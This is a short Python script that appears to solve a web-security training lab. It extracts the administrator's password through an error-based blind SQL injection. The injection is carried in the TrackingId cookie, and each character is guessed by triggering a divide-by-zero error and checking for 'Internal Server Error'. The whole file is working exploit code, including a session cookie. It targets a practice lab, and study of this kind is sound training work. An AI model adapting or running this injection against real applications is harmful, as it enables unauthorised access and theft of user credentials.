import requests

url = "https://0ad300060396976d800926f200cf00cf.web-security-academy.net/filter"
params = {"category": "Gifts"}

result = ''
for i in range(1,30):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789A':
        headers = {
            "Host": "0ad300060396976d800926f200cf00cf.web-security-academy.net",
            "Cookie": f"TrackingId=lmao' OR (SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN 1/0 ELSE NULL END FROM users WHERE username='administrator') IS NOT NULL --; session=E6dPZ82ZATVetcmN4l1H73Bj2pFRFeqZ",
            "Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://0ad300060396976d800926f200cf00cf.web-security-academy.net/",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=0, i"
        }

        response = requests.get(url, params=params, headers=headers)
        
        if(response.text.find("Internal Server Error") != -1):
            print(f"Found {i}: " + char)
            result += char
            print(result)
            break
        
    if char == 'A':
        break;
    
print(result)        
